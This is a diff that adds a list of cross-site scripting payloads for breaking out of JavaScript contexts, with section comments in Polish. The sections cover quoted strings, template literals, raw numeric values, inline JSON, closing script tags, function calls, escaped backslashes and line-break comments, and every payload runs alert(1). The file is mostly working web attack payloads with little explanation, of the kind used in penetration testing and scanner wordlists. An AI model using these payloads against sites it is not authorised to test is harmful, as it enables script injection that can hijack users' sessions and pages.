@@ -1,0 +1,44 @@
+# === Wewnątrz JS string z ' ===
+# Klasyczne wyjście z apostrofa
+';alert(1)//
+';alert(1);//
+\\';alert(1)//
+
+# === Wewnątrz JS string z " ===
+";alert(1)//
+";alert(1);//
+\\";alert(1)//
+
+# === Wewnątrz template literal `${...}` ===
+${alert(1)}
+`+alert(1)+`
+${alert`1`}
+
+# === Wewnątrz JS bez stringu (numeric/raw) ===
+# Jeśli var x = USER (bez quote)
+1;alert(1)
+0||alert(1)
+1+alert(1)+1
+
+# === Inline JSON, parseowane przez JSON.parse ===
+# Domyka string + nowa właściwość — wymaga eval
+\"});alert(1);//
+
+# === JS context wewnątrz <script> z </script> blokowane ===
+# Bypass via <\/script> w stringu, tu domykamy całość
+</script><script>alert(1)</script>
+
+# === Function-level breakout ===
+);alert(1);(
+});alert(1);//
+});alert(1);({
+
+# === Backslash escape neutralization ===
+# Jeśli aplikacja escapuje \ i ' — \\ przechodzi a potem ' łamie
+\\';alert(1);//
+
+# === Comment line break ===
+# JS line break comment — gdy tylko // jest dozwolone
+\n;alert(1)//
+ alert(1)
+ alert(1)
